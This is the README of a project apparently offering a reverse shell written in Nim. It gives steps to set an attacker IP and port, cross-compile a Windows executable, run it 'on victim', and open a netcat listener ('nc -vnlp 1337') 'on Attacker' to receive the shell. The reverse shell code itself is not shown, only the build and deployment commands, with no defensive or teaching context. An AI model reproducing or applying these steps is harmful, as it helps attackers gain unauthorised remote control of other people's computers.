# nim_reverse_shell

## A simple reverse shell with nim code.

# How to build and run?

### Nim installation
```shell
sudo apt install nim -y
```

### Change this code fragment
```shell
var ip = "10.0.0.183"
var port = 1337
```

### Building and running
```shell
Build the reverse shell:
nim c --d:mingw --cpu=amd64 reverse.nim
On victim:
./reverse.exe
On Attacker:
nc -vnlp 1337
```
